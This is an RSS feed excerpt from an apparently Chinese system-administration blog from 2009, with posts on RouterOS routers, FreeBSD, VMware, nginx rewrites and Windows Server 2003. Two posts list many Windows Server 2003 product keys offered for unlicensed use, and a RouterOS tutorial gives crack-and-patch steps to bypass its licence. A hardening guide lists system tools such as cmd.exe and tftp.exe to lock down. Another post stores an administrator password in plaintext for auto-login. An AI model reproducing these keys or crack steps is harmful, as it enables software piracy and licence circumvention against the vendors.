      <description>中文版： 标准版 V9RX3-3GMKQ-M23KP-FYTQX-KQP8B M7V9W-W8GBT-3R8WT-G24V7-YKKJB P8TMF-WW9GT-XVQJ4-43V9D-69KJB WP226-BBDF3-WP2R3-HM2CY-82C8B PQ93W-D2H8Y-VVY2M-H7K99-MTXJB BQ24G-R7CHM-FR9D6-2VRRY-Y2C8B KKM7F-PB4GC-7DMH2-KKYXB-RG34M B6DCT-R2XG2-3KQPW-XV937-BJ6WB GTKQM-MQ87D-QGXW6-BDTQ7-4TRYY QH9MW-4T4KW-FBJ97-MPJCF-3C4YY TGK6W-VFP28-46KGK-8FTFW-9QJMY KHD69-H8BHX-7KC9K-624CT-V3VRM WDRWF-4PXTG-4CGMJ-4MCC4-G6MFM RWH86-PYQJ7-XMWJG-TRHQF-XM8MY 企业版 MDGJK-PF6YQ-PD8DJ-RFQVM-7WKWG 英文版： 企业版 RHBX7-YVMY6-2QHM8-CHYHR-JMPPB M4B8J-DQP9R-PY6J4-TJG78-FRCPB HP6YG-KKQV7-GCV3T-C3WRD-QJBRY G4W9P-Q2DQC-224X9-RQ7TM-PDGCB QKQQB-PV8W3-3PBJF-RC4DM-9QRFY PR86X-KWMQK-6CJVG-RCXFX-WWKWM PGCFX-RGRGX-VFHRX-WT6TJ-QVFFY F8QV3-BTYMR-V4GHX-B43FM-DY6CB MXC6T-JW7WQ-DY7H3-F8JV7-V9XWM DR7QV-WQDC8-G4DP9-9TY2P-Y9CPB HWX9H-KVPMC-3W2DJ-P2392-K9G8M 标准版 PCGCG-MP77F-9DBC9-QHW44-TDBRD KT3YM-JRM8T-JWV6Q-RQMG9-BBT73 PBJM7-PC3FJ-MDF66-G7FX9-DTH4D KCHH3-W4FT6-DKRVY-MR9R6-2MDH3 J43D2-G6Y7K-R3HPY-673T9-8XMRD H7DT2-WV3MM-V4RY6-6JM6W-9P673 M67V8-RYXPT-F23TR-M6YBY-47673 WGHD9-C7368-B8MF9-J8FP4-4BDH3 FJ6GG-XR424-6C7JB-HHVMC-RWWYQ RFHCQ-7GY3J-W336Y-FFYVC-9D3H3 TP2TD-KPYGJ-D82HX-FR82W-KBH4D VD2BM-TP2KK-CBXDQ-7B7FQ-4M9V3 HGX39-BVTG6-MKMWX-JWRYC-FPFFD
原文 http://bbs.pcbeta.com/archiver/tid-427973.html
Windows Server 2003 Standard x64 Edition BTQHD-KMR67-36M66-8KCRR-FXTBB BTQ8X-6MJ6M-VRJVQ-C7X82-V2FDY BTW6C-6TJMW-3RMW7-3D2VD-PFCMB BT2H3-KWT84-CXVXM-WDGQX-7TPMB
windows 2003 server r2 EE (64BIT) PCGCG-MP77F-9DBC9-QHW44-TDBRD KT3YM-JRM8T-JWV6Q-RQMG9-BBT73 PBJM7-PC3FJ-MDF66-G7FX9-DTH4D KCHH3-W4FT6-DKRVY-MR9R6-2MDH3
Microsoft Windows Server 2003 R2 Datacenter Edition VLK</description>
    </item>
    
    <item>
      <title>Windows Server 2003 注册码大全</title>
      <link>http://example.org/2009/04/12/windows-server-2003-e6b3a8e5868ce7a081e5a4a7e585a8/</link>
      <pubDate>Sun, 12 Apr 2009 16:37:08 +0000</pubDate>
      
      <guid>http://example.org/2009/04/12/windows-server-2003-e6b3a8e5868ce7a081e5a4a7e585a8/</guid>
      <description>WINDOWS SERVER 2003 ENTERPRISE-CORP 注册码 JB88F-WT2Q3-DPXTT-Y8GHG-7YYQY
WINDOWS SERVER 2003 VLK 注册码 JB88F-WT2Q3-DPXTT-Y8GHG-7YYQY
WINDOWS SERVER 2003 RTM Enterprise 注册码 qw32k-48t2t-3d2pj-dxbwy-c6wrj
WINDOWS SERVER 2003 RTM Standard 注册码 m6rj9-tbjh3-9ddxm-4vx9q-k8m8m
WINDOWS SERVER 2003 RTM Web Server 注册码 d42x8-7mwxd-m4b76-mkyp7-cw9fd
WINDOWS SERVER 2003 CPP KEYS - NOT RTM 注册码 cky24-q8qrh-x3kmr-c6bcy-t847y
Windows Server 2003 En., Final MSDN RTM 注册码 QW32K-48T2T-3D2PJ-DXBWY-C6WRJ
Windows 2003 BUILD 3790 RTM 注册码 QW32K-48T2T-3D2PJ-DXBWY-C6WRJ QW00K-00T0T-0D0PJ-DXBWY-C0WRJ
All of these keys are cpp keys. 注册码 K4RBR-F3K42-M9RXG-48TPR-H6BPB</description>
    </item>
    
    <item>
      <title>ROS常用命令简介</title>
      <link>http://example.org/2009/04/11/ros-everyday-commands/</link>
      <pubDate>Sat, 11 Apr 2009 17:39:04 +0000</pubDate>
      
      <guid>http://example.org/2009/04/11/ros-everyday-commands/</guid>
      <description>ROUTEROS常用命令
/sy reset 恢复路由原始状态 /sy reboot 重启路由 /sy showdown 关机 /sy ide set name=机器名 设置机器名 /export 查看配置 /ip export 查看IP配置 /sy backup 回车 save name=你要设置文件名 备份路由 LOAD NAME=你要设置文件名 恢复备份 /interface print 查看网卡状态 0 X ether1 ether 1500 这个是网卡没有开启 0 R ether1 ether 1500 这个是正常状态 /int en 0 激活0网卡 /int di 0 禁掉0网卡 /ip fir con print 查看当前所有网络边接 /ip service set www port=81 改变www服务端口为81 /ip hotspot user add name=user1 password=1 增加用户 [admin@MikroTik] &amp;gt; Certificate———-证书管理 Driver—————设备管理 File——————当地路由器文件的存储 interface ————接口配置 log ——————系统记录 password ————改变密码 ping —————-发送,回送ICMP数据包 port —————–串行端口 quit —————-退出控制 radius—————Radius客户机设置 redo——————- Redo previosly undone action setup —————-基本的系统设置 snmp —————–SNMP 设置 special-login———–专用的登陆用户 undo—————– 取先前的效果 user——————-用户管理 ip——————— IP 选项 queue ———————-带宽管理 system——————- 系统信息和有效的程序 tool———————– 诊断工具 export ——————–显示或保存导出的脚本那是用来恢复的 配置 [admin@MikroTik] &amp;gt; [admin@MikroTik] ip&amp;gt; accounting ————————交通统计 address —————————地址管理 arp —————————ARP 进入管理 dns ————————DNS 设置 firewall ——————防火墙管理 neighbor ———————邻居 packing ———————数据打包设定 pool ————————-IP地址池 route———————– 路由管理 service ———————IP 服务 policy-routing —————-路由政策 upnp ————————- Universal 即插即用 vrrp————————虚拟路由沉余协议 socks ———————-SOCKS 版本4代理 hotspot——————– HotSpot 管理 ipsec ——————IP安全 web-proxy —————–HTTP 代理 export————————显示或保存导出的脚本那是用来恢复的configuration [admin@MikroTik] ip&amp;gt; 列出可用的命令和菜单并有简短的描述到下一个项目.</description>
    </item>
    
    <item>
      <title>网吧专用ros软路由教程(非常详细)</title>
      <link>http://example.org/2009/04/11/e7bd91e590a7e4b893e794a8rose8bdafe8b7afe794b1e69599e7a88be99d9ee5b8b8e8afa6e7bb86/</link>
      <pubDate>Sat, 11 Apr 2009 17:14:10 +0000</pubDate>
      
      <guid>http://example.org/2009/04/11/e7bd91e590a7e4b893e794a8rose8bdafe8b7afe794b1e69599e7a88be99d9ee5b8b8e8afa6e7bb86/</guid>
      <description>一：安装
1、光盘版的（转自雨纷飞大哥作品） 将iso文件刻录成可引导光盘。机器的硬盘设置为IDE0，即第一个IDE通道的主盘。 bios设置光盘引导系统，放入光盘启动机器得到如下
选择 2：Install RouteOS 2.8.18后稍等，得到如下画面： 用方向键和空格选择你需要的模组功能后，按＂Ａ＂全选，摁“i“键确定安装。会再次询问你继续？yes or no?，摁“Y“. 然后又问:do you want to keep lod configuraton?你需要保留旧的结构么?摁“N 然后开始自动的格式化磁盘、安装核心、安装模组。最后提示： Press ENTER to Reboot，按回车重新启动机器。
重新启动后出现图1的那个引导画面(如果没有出现而直接进了登陆界面说明用硬盘引导了)：
选择3: Crack RouteOS Floppy Disk,开始破解。 破解过程都是中文的。如果你的硬盘在IDE0:0的话破解是不会有问题的。否则可能出现系统文件被破坏、启动时0123456…循环出现等问题。 问你是否重启呢。把光盘拿出来后按下Y确定重启动
重新启动后开始登陆。初始用户名admin，初始密码为空。 咦？怎么还有提示注册的信息和Soft ID？ 原来是还需要一个命令激活注册补丁才可以哦： 输入命令：/system license import file-name=key 或者缩写为/sy lic i f key 然后提示你是否重新启动。按Y重新启动 重新启动并用admin:““登陆后发现，提示注册的信息已经完全消失了，现在是正式版了
现在服务器启动起来了，但是还没有任何配置，若想用winbox对其进行控制，则必须激活和配置网卡的ip 掩码等。这里我装了三块网卡，一块接电信，一块接网通，一块路由后接内网交换机。 首先看看三块网卡是否都被识别出来了，命令是： /interface print 可以缩写为 /int pri 以后用缩写不再另外注名。 结果应该如下图：
然后我们来激活他们，命令是： ENABLE 0
ENABLE 1 ENABLE 2 0是第一块网卡。 激活后没有提示。用print命令查看后发现网卡前面的X变成R，就代表激活成功了。 如下图
但是ether1 ether2之类的名字实在是抽象不便于以后的配置，所以我们把网卡给改个名字： 命令： SET 0 NAME=newname 我这里用 set 0 name=dianxin set 1 name=wangtong set 2 name=neiwang 如下图：改名成功。</description>
    </item>
    
    <item>
      <title>ROS安装配制教程</title>
      <link>http://example.org/2009/04/11/rose5ae89e8a385e9858de588b6e69599e7a88b/</link>
      <pubDate>Sat, 11 Apr 2009 17:00:26 +0000</pubDate>
      
      <guid>http://example.org/2009/04/11/rose5ae89e8a385e9858de588b6e69599e7a88b/</guid>
      <description>ROS2.927安装 机器要求 主板:845以上 网卡:Intel 82559(推荐)也可以使用8139.INTEL82540等 硬盘:电子硬盘(推荐)也可以使用IDE硬盘1G-80G 光驱:安装时使用 显卡:主板自带(或者别的,没有要求)
好了可以开始了,从光盘启动 我们可以看到这个画面
这里是问你选择要安装的组件,我们按A全选(也可以通过方向键和空格键选择要安装的组件) 这里先不作组件的介绍,我就就全选 A 按I键开始安装 会有一个提示 Do you want to keep old configuration? [y/n]: 意思问你是否保持磁盘原有的格式,这里我们选N,不保留
接下来还有个提示, Continue? 意思是是否格式化硬盘,我们选Y
正在格式化硬盘,正在复制文件 安装完成,按回车重启 这个时候请取出光盘,或调成从硬盘启动,或者拆下光驱,ROS就安装好了,光驱不需要了
启动路由,进入登录界面
接上内网网线,也可以直接也计算机对连(这里等下再讲,请跳至) 在WIN下用WINBOX访问
ROS下配制 默认用户名:ADMIN 密码:空
登录成功会有一个提示 Do you want to see the software license? [y/n]: 意思是问你是否要看ROS使用说明和服务条款,都是E文的,我是看不懂,如果你想看 的话选Y,这里我就不看了选N跳过直接进入我们关键的IP配制关键步骤
setup 开始配制
r - reset all router configuration (恢复所有设置,回到初使) l - configure ip address and gateway a - configure ip akkress and gateway d - setup dhcp client s - setup dhxp server p - setup pppoe client t - setup pptp client x - exit menu (退出菜单) your choice [press Enret to configure ip address and gateway]: 我们选A 添加IP</description>
    </item>
    
    <item>
      <title>ros routeros限速和限线程脚本</title>
      <link>http://example.org/2009/04/11/ros-routerose99990e9809fe5928ce99990e7babfe7a88be8849ae69cac/</link>
      <pubDate>Sat, 11 Apr 2009 16:47:41 +0000</pubDate>
      
      <guid>http://example.org/2009/04/11/ros-routerose99990e9809fe5928ce99990e7babfe7a88be8849ae69cac/</guid>
      <description>限线程脚本：
:for aaa from 2 to 254 do={/ip firewall filter add chain=forward src-address=(192.168.0. . $aaa) protocol=tcp connection-limit=50,32 action=drop}
限速脚本：
:for aaa from 2 to 254 do={/queue simple add name=(queue . $aaa) dst-address=(192.168.0. . $aaa) limit-at=0/0 max-limit=2000000/2000000}
说明： 脚本为一行不是两行 aaa是变量 2 to 254是2~254 192.168.0. . $aaa是IP 上两句加起来是192.168.0.2~192.168.0.254的意思 connection-limit=50是线程数这里为50 max-limit=2000000/2000000是上行2m／下行2m
使用： WinBox-System-Scripts-＋ Name(脚本名程) Source(脚本) OK-选择要运行的脚本-Run Script
查看规则是否填加进来： 限线程：WinBox-IP-Firewall-Filter Rules 限速：WinBox-Queues-Simple Queues 手动设置限速
winbox&amp;mdash;queues&amp;mdash;-simple queues
点“+”，NAME里随便填，下面是IP地址的确定
①Target Address 不管，Dst. Address里填 你要限制的内网机器的IP，比如我这里有个 1号机器 IP为 192.</description>
    </item>
    
    <item>
      <title>在FreeBSD中安装虚拟机(使用于BSD)</title>
      <link>http://example.org/2009/04/11/e59ca8freebsde4b8ade5ae89e8a385e8999ae68b9fe69cbae4bdbfe794a8e4ba8ebsd/</link>
      <pubDate>Sat, 11 Apr 2009 13:56:31 +0000</pubDate>
      
      <guid>http://example.org/2009/04/11/e59ca8freebsde4b8ade5ae89e8a385e8999ae68b9fe69cbae4bdbfe794a8e4ba8ebsd/</guid>
      <description>原来BSD中也有虚拟机的.速度不亚于VM
在FreeBSD6.2中,
#cd /usr/ports/emulators/qemu
#make WITH_KQEMU=yes install clean
选项默认
安装好后，就可以用了
要重起一下电脑,如不重起,可以
#rehash
#kldload kqemu.ko
速度真的很快！但对我最重要的是，它很简洁.
原来在xp用VM装了openBSD
用qemu来运行.
挂载 mount -t ntfs /dev/ad0s1 /mnt
然后
#cd /mnt/OpenBSD #qemu Other.vmdk
启动成功！
下来怎么新安装一个虚拟系统：( 我是在边安装边写的，:-)，网上说的和实际有点出入的）
#df -h
看看自己的硬盘空间，看装在哪里合适
我的/usr还有很多空间，就装在这里吧
#mkdir /usr/qemu
#cd /usr/qemu
#qemu-img create FreeBSD.img 3G (这里是建立一个镜像文件，给它多大空间，我给3G，名叫FreeBSD.img.)
#qemu -hda FreeBSD.img -cdrom /dev/acd0 -boot d -m 256
-hda 指定硬盘
-cdrom 指定光驱
/dev/acd0 (iso就是文件路径）
-boot d a软盘 c 硬盘 d 光驱
-m 内存大小
其间可能要出现错误:
Bad system call (用kldload aio解决）</description>
    </item>
    
    <item>
      <title>php5.2.9 不能加载 eAccelerator 问题</title>
      <link>http://example.org/2009/04/11/php529-e4b88de883bde58aa0e8bdbd-eaccelerator-e997aee9a298/</link>
      <pubDate>Sat, 11 Apr 2009 09:20:18 +0000</pubDate>
      
      <guid>http://example.org/2009/04/11/php529-e4b88de883bde58aa0e8bdbd-eaccelerator-e997aee9a298/</guid>
      <description>装上php 5.2.9发现不能加载 eAccelerator ,php也没有报错,不知道是什么问题,
看了一篇文章 在 /usr/local/etc/php/extensions.ini 加上 extension=eaccelerator.so才可以解决,
[eaccelerator] zend_extension = &amp;quot;/usr/local/lib/php/20060613-zts/eaccelerator.so&amp;quot; eaccelerator.shm_size = &amp;quot;128&amp;quot; eaccelerator.cache_dir = &amp;quot;/tmp/eaccelerator&amp;quot; eaccelerator.enable = &amp;quot;1&amp;quot; eaccelerator.optimizer = &amp;quot;1&amp;quot; eaccelerator.check_mtime = &amp;quot;1&amp;quot; eaccelerator.debug = &amp;quot;0&amp;quot; eaccelerator.log_file = &amp;quot;/var/log/httpd/eaccelerator.log&amp;quot; eaccelerator.filter = &amp;quot;&amp;quot; eaccelerator.shm_max = &amp;quot;0&amp;quot; eaccelerator.shm_ttl = &amp;quot;0&amp;quot; eaccelerator.shm_prune_period = &amp;quot;0&amp;quot; eaccelerator.shm_only = &amp;quot;0&amp;quot; eaccelerator.compress = &amp;quot;1&amp;quot; eaccelerator.compress_level = &amp;quot;9&amp;quot; eaccelerator.keys = &amp;quot;shm&amp;quot; eaccelerator.sessions = &amp;quot;shm&amp;quot; eaccelerator.content = &amp;quot;shm&amp;quot; 原文 http://gary1974tw.pixnet.net/blog/post/26613606 可惜被x了</description>
    </item>
    
    <item>
      <title>安全中国 Windows 2003安全设置大全</title>
      <link>http://example.org/2009/04/10/e5ae89e585a8e4b8ade59bbd-windows-2003e5ae89e585a8e8aebee7bdaee5a4a7e585a8/</link>
      <pubDate>Fri, 10 Apr 2009 10:51:48 +0000</pubDate>
      
      <guid>http://example.org/2009/04/10/e5ae89e585a8e4b8ade59bbd-windows-2003e5ae89e585a8e8aebee7bdaee5a4a7e585a8/</guid>
      <description>安全中国 Windows 2003安全设置大全 安全中国（http://www.anqn.com）——全球最大中文黑客门户
前面讲的都是屁话，润润笔而已。（俺也文人一次） 话锋一转就到了系统权限设置与安全配置的实际操作阶段 系统设置网上有一句话是“最小的权限+最少的服务=最大的安全”。此句基本上是个人都看过，但我好像 没有看到过一篇讲的比较详细稍具全面的文章，下面就以我个人经验作一次教学尝试！ 最小的权限如何实现？ NTFS系统权限设置 在使用之前将每个硬盘根加上 Administrators 用户为全部权限(可选加入SYSTEM用户) 删除其它用户，进入系统盘:权限如下 C:\WINDOWS Administrators SYSTEM用户全部权限 Users 用户默认权限不作修改 其它目录删除Everyone用户，切记C:\Documents and Settings下All Users\Default User目录及其子目录 如C:\Documents and Settings\All Users\Application Data 目录默认配置保留了Everyone用户权限 C:\WINDOWS 目录下面的权限也得注意,如 C:\WINDOWS\PCHealth、C:\windows\Installer也是保留了Everyone权限. 删除C:\WINDOWS\Web\printers目录，此目录的存在会造成IIS里加入一个.printers的扩展名，可溢出攻击 默认IIS错误页面已基本上没多少人使用了。建议删除C:\WINDOWS\Help\iisHelp目录 删除C:\WINDOWS\system32\inetsrv\iisadmpwd，此目录为管理IIS密码之用，如一些因密码不同步造成500 错误的时候使用 OWA 或 Iisadmpwd 修改同步密码，但在这里可以删掉，下面讲到的设置将会杜绝因系统 设置造成的密码不同步问题。 打开C:\Windows 搜索 net.exe;cmd.exe;tftp.exe;netstat.exe;regedit.exe;at.exe;attrib.exe;cacls.exe;format.com; regsvr32.exe;xcopy.exe;wscript.exe;cscript.exe;ftp.exe;telnet.exe;arp.exe;edlin.exe; ping.exe;route.exe;finger.exe;posix.exe;rsh.exe;atsvc.exe;qbasic.exe;runonce.exe;syskey.exe 修改权限，删除所有的用户只保存Administrators 和SYSTEM为所有权限 关闭445端口 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\netBT\Parameters 新建 “DWORD值”值名为 “SMBDeviceEnabled” 数据为默认值“0” 禁止建立空连接 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa 新建 “DWORD值”值名为 “RestrictAnonymous” 数据值为“1” [2003默认为1] 禁止系统自动启动服务器共享 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters 新建 “DWORD值”值名为 “AutoShareServer” 数据值为“0” 禁止系统自动启动管理共享 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters 新建 “DWORD值”值名为 “AutoShareWks” 数据值为“0” 通过修改注册表防止小规模DDOS攻击 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters 新建 “DWORD值”值名为 “SynAttackProtect” 数据值为“1” 禁止dump file的产生 dump文件在系统崩溃和蓝屏的时候是一份很有用的查找问题的资料。然而，它也能够给黑客提供一些敏感 信息比如一些应用程序的密码等。控制面板&amp;gt;系统属性&amp;gt;高级&amp;gt;启动和故障恢复把 写入调试信息 改成无。 关闭华医生Dr.</description>
    </item>
    
    <item>
      <title>Конфиг ядра FreeBSD 7 для работы в VMware ESXi (FreeBSD/amd64)</title>
      <link>http://example.org/2009/04/08/d0bad0bed0bdd184d0b8d0b3-d18fd0b4d180d0b0-freebsd-7-d0b4d0bbd18f-d180d0b0d0b1d0bed182d18b-d0b2-vmware-esxi-freebsdamd64/</link>
      <pubDate>Wed, 08 Apr 2009 17:43:49 +0000</pubDate>
      
      <guid>http://example.org/2009/04/08/d0bad0bed0bdd184d0b8d0b3-d18fd0b4d180d0b0-freebsd-7-d0b4d0bbd18f-d180d0b0d0b1d0bed182d18b-d0b2-vmware-esxi-freebsdamd64/</guid>
      <description>cpu HAMMER ident VMWARE options SCHED_ULE # ULE scheduler options PREEMPTION # Enable kernel thread preemption options INET # InterNETworking options INET6 # IPv6 communications protocols options SCTP # Stream Control Transmission Protocol options FFS # Berkeley Fast Filesystem options SOFTUPDATES # Enable FFS soft updates support options UFS_ACL # Support for access control lists options UFS_DIRHASH # Improve performance on big directories options UFS_GJOURNAL # Enable gjournal-based UFS journaling options MD_ROOT # MD is a potential root device options NFSCLIENT # Network Filesystem Client options NFSSERVER # Network Filesystem Server options NFSLOCKD # Network Lock Manager options NFS_ROOT # NFS usable as /, requires NFSCLIENT options NTFS # NT File System options MSDOSFS # MSDOS Filesystem options CD9660 # ISO 9660 Filesystem options PROCFS # Process filesystem (requires PSEUDOFS) options PSEUDOFS # Pseudo-filesystem framework options GEOM_PART_GPT # GUID Partition Tables.</description>
    </item>
    
    <item>
      <title>修改时间出现date: can&#39;t reach time daemon, time set locally</title>
      <link>http://example.org/2009/04/08/e4bfaee694b9e697b6e997b4e587bae78eb0date-cant-reach-time-daemon-time-set-locally/</link>
      <pubDate>Wed, 08 Apr 2009 14:05:02 +0000</pubDate>
      
      <guid>http://example.org/2009/04/08/e4bfaee694b9e697b6e997b4e587bae78eb0date-cant-reach-time-daemon-time-set-locally/</guid>
      <description>kern.securelevel 过高了,郁闷</description>
    </item>
    
    <item>
      <title>vmware freebsd 时间不准解决办法</title>
      <link>http://example.org/2009/04/08/vmware-e697b6e997b4e4b88de58786e8a7a3e586b3e58a9ee6b395/</link>
      <pubDate>Wed, 08 Apr 2009 14:02:24 +0000</pubDate>
      
      <guid>http://example.org/2009/04/08/vmware-e697b6e997b4e4b88de58786e8a7a3e586b3e58a9ee6b395/</guid>
      <description>/boot/loader.conf
加入
kern.hz=100 hint.apic.0.disabled=1 The default &amp;ldquo;tick&amp;rdquo; on FreeBSD is 1000 Hz, which is far greater than what a virtual machine can keep up with accurately, 100Hz is more reasonable value. APIC has been known to cause issues with FreeBSD, but is required if you are using SMP in your guest (2 or more processors).
原文 http://peterkieser.com/technical/vmware-server-issues/</description>
    </item>
    
    <item>
      <title>利用Curl、socket、file_get_contents POST数据</title>
      <link>http://example.org/2009/04/06/use-curl-socket-file_get_contents-post-data/</link>
      <pubDate>Mon, 06 Apr 2009 08:51:54 +0000</pubDate>
      
      <guid>http://example.org/2009/04/06/use-curl-socket-file_get_contents-post-data/</guid>
      <description>array( &amp;lsquo;method&amp;rsquo;=&amp;gt;&amp;lsquo;POST&amp;rsquo;, &amp;lsquo;header&amp;rsquo;=&amp;gt;&amp;lsquo;Content-type: application/x-www-form-urlencoded&amp;rsquo;.&amp;quot;\r\n&amp;quot;. &amp;lsquo;User-Agent : Jimmy&#39;s POST Example beta&amp;rsquo;.&amp;quot;\r\n&amp;quot;. &amp;lsquo;Content-length: &amp;lsquo;.strlen($post_string)+8, &amp;lsquo;content&amp;rsquo;=&amp;gt;&amp;lsquo;mypost=&amp;rsquo;.$post_string) ); $stream_context = stream_context_create($context); $data = file_get_contents($remote_server,FALSE,$stream_context); return $data; }
?&amp;gt; 转自 http://hi.baidu.com/xsite/blog/item/1ae57963be3e38680d33fa6b.html</description>
    </item>
    
    <item>
      <title>實現系統管理員administrator自動登入</title>
      <link>http://example.org/2009/04/05/e5afa6e78fbee7b3bbe7b5b1e7aea1e79086e593a1administratore887aae58b95e799bbe585a5/</link>
      <pubDate>Sun, 05 Apr 2009 13:48:31 +0000</pubDate>
      
      <guid>http://example.org/2009/04/05/e5afa6e78fbee7b3bbe7b5b1e7aea1e79086e593a1administratore887aae58b95e799bbe585a5/</guid>
      <description>首先要取消登入時按 Ctrl+Alt+Del 鍵才顯示登入窗口 方法: 在〔開始〕→〔系統管理工具〕→〔本機安全性原則〕→ 〔本機安全性原則〕→在〔安全性選項〕的右邊窗口→ 打開〔Interactive logon: Do not require CTRL+ALT+DEL〕 選〔啟用〕後重新開機生效
之後，便要實現系統管理員administrator自動登入，方法有多種如下： 方法一： 打開「開始」→「運行」，在「運行」 一欄中輸入「Rundll32 netplwiz.dll,UsersRunDll」 去除「要使用本機，用戶必須輸入用戶名密碼」復選框中的勾號
方法二： 2、修改註冊表
通過改動註冊表可實現自動登入，方法是打開「開始」→「運行」，
在「運行」一欄中輸入「Regedit」命令打開註冊表編輯器，
依次打開HKEY_LOCAL_MACHIN\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon，
在右側窗口分別新鍵字符串值 autoadminlogon：鍵值為1；
defaultpassword：鍵值為自動登入用戶的密碼。
其中在註冊表中有 defaultusername 這個字符串值， 其默認鍵值是Administrator，您也可將它更改為自己所需要的管理員帳號
方法三： 右擊桌面,新建一個記事本文件,打開,按下面的格式書寫.
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]
&amp;ldquo;DefaultUserName&amp;rdquo;=&amp;ldquo;你的用戶名&amp;rdquo;
&amp;ldquo;DefaultPassword&amp;rdquo;=&amp;ldquo;密碼&amp;rdquo;
&amp;ldquo;AutoAdminLogon&amp;rdquo;=&amp;ldquo;1&amp;rdquo;
最後儲存及重命名,為自動登陸.reg 然後雙擊導入表.
為了防止出錯,你最好是複製我的這個命令,然後點編輯,替換,把這幾個需要改動的地方用替換的辦法進行替換.
這樣也可以實現自動登入Windows系統了.
考慮到新手容易出錯.如果不能出錯不能進入桌面,則在開機的時候按住SHIFT鍵,可以出現登陸界面,手動輸入密碼就是了.
原文 http://www.138technicity.com/vipbbs/ccb/topic_view.cgi?forum=5&amp;amp;article;_id=0005081030225019&amp;amp;publishtime;_id=0005081030225019&amp;amp;new;_window=1&amp;amp;page;=15</description>
    </item>
    
    <item>
      <title>VMware Server、VMware GSX Server、VMware ESX Server,VI说明</title>
      <link>http://example.org/2009/04/05/vmware-servere38081vmware-gsx-servere38081vmware-esx-servervie8afb4e6988e/</link>
      <pubDate>Sun, 05 Apr 2009 10:45:11 +0000</pubDate>
      
      <guid>http://example.org/2009/04/05/vmware-servere38081vmware-gsx-servere38081vmware-esx-servervie8afb4e6988e/</guid>
      <description>免费的VMware Server：还在VMware推行它宏伟的虚拟化蓝图之前，ESX Server的上一代版本GSX Server已经销售了五年之久，它当时的售价接近现在的ESX Server。和ESX Server一样，GSX Server也是专注于数据中心的布置，后来VMware发布了企业管理工具VirtualCenter，可以使管理GSX Server和 ESX Server完全一样。
自从2001年VMware推出GSX Server至今，已有300多家著名大公司采用了该系统。2005年末，VMware终于推出了该公司史上第一款虚拟化产品VMware Play。接下来，又做出决定把即将推出的GSX Server 4.0转为免费，并重新命名为Server 1.0。这就是VMware Server的由来。 说白了，免费的VMware Server就是VMware GSX，也就是ESX的上一代产品。
GSX Server和ESX Server，两个产品都可以提供多操作系统运行支持。但这两个产品采取的实现方式不同，GSX Server在宿主操作系统中以应用程序的方式运行服务器仿真会话，比如在Windows 2000系统中运行多个服务器仿真系统。而GSX Server的后继产品 ESX Server则基于专有的系统平台，使用分立的分区来隔离每一个虚拟系统，这消除了GSX Server无法避免的性能瓶颈，且可以将计算性能动态分配给有计算任务的虚拟服务器。
VMware Workstation是用在个人桌面系统中的，而VMware GSX Server与VMWare ESX Server用于服务器的，VMware Workstation与VMware GSX Server需要操作系统的支持，而VMWare ESX Server不需要操作系统的支持，即在主机没有操作系统的情况下也可以安装。 VMware GSX Server是界于VMware Workstation与VMWare ESX Server的一个版本。VI，也就是VMware Infrastructure，可在硬件上直接運作。因為性能的考慮，一般在主生產環境中建議使用 VI3。
ESX企业级，GSX工作组级，Workstation单机级
有的文章说：VMware Workstation与GSX Server的一个区别在于Workstation不能进行远程控制，要维护该虚拟机，必须要到宿主机上进行物理操作，不知道它们所说的Workstation是什么版本的，我在VMware Workstation 6.0.3版本下进行远程控制维护是成功的。
Esx Server 是一个全新的架构，它本身就有一个基于 linux 的操作系统，基于虚拟服务器进行了优化，所以效率会比以上版本都高。 一、ESX Server 2.5.x的设计 下面我们讨论的体系结构和设计中，我们假设一个应用环境，它由最少两个ESXServer系统、共享的SAN存储、VirtualCenter和VMotion。
1.ESX Server 2.5.x特性概述 ESX Server 2.5.x有下面的特性 ESX server物理机 ·每ESX Server支持16个逻辑CPU ·每ESX Server支持80个虚拟机CPU ·每ESX Server支持64GB内存 ·支持8个swap文件，每个swap文件的最大容量为64GB ·每系统支持64个适配器 ·支持8个千兆网卡或者16个百兆网卡 ·每个虚拟交换机支持32个虚拟机 ·每ESX Server支持16个光纤通道卡 ·每个存储阵列支持128个LUN ·每ESX Server支持128个LUN</description>
    </item>
    
    <item>
      <title>nginx 绑定多域名跳转问题</title>
      <link>http://example.org/2009/04/04/nginx-e7bb91e5ae9ae5a49ae59f9fe5908de8b7b3e8bdace997aee9a298/</link>
      <pubDate>Sat, 04 Apr 2009 15:49:44 +0000</pubDate>
      
      <guid>http://example.org/2009/04/04/nginx-e7bb91e5ae9ae5a49ae59f9fe5908de8b7b3e8bdace997aee9a298/</guid>
      <description>如 server_name 是 andsky.com www.andsky.com
www.andsky.com 會自動轉到 andsky.com
用以下方法可以解决
if (-d $request_filename){ rewrite ^/(.*)([^/])$ http://$host/$1$2/ permanent; } </description>
    </item>
    
    <item>
      <title>nginx echsop rewrite规则</title>
      <link>http://example.org/2009/04/03/nginx-echsop-rewrite/</link>
      <pubDate>Fri, 03 Apr 2009 12:19:40 +0000</pubDate>
      
      <guid>http://example.org/2009/04/03/nginx-echsop-rewrite/</guid>
      <description>从网上搜索到的规则,但不能用,修改了一下,
rewrite ^/index.html$ /index.php; rewrite ^/category$ /index.php; rewrite ^/feed-c([0-9]+).xml$ /feed.php?cat=$1; rewrite ^/feed-b([0-9]+).xml$ /feed.php?brand=$1; rewrite ^/feed.xml$ /feed.php; rewrite ^/category-([0-9]+)-b([0-9]+)-min([0-9]+)-max([0-9]+)-attr([^-]*)-([0-9]+)-(.+)-([a-zA-Z]+)(.*).html$ /category.php?id=$1&amp;amp;brand;=$2&amp;amp;price;_min=$3&amp;amp;price;_max=$4&amp;amp;filter;_attr=$5&amp;amp;page;=$6&amp;amp;sort;=$7&amp;amp;order;=$8; rewrite ^/category-([0-9]+)-b([0-9]+)-min([0-9]+)-max([0-9]+)-attr([^-]*)(.*).html$ /category.php?id=$1&amp;amp;brand;=$2&amp;amp;price;_min=$3&amp;amp;price;_max=$4&amp;amp;filter;_attr=$5; rewrite 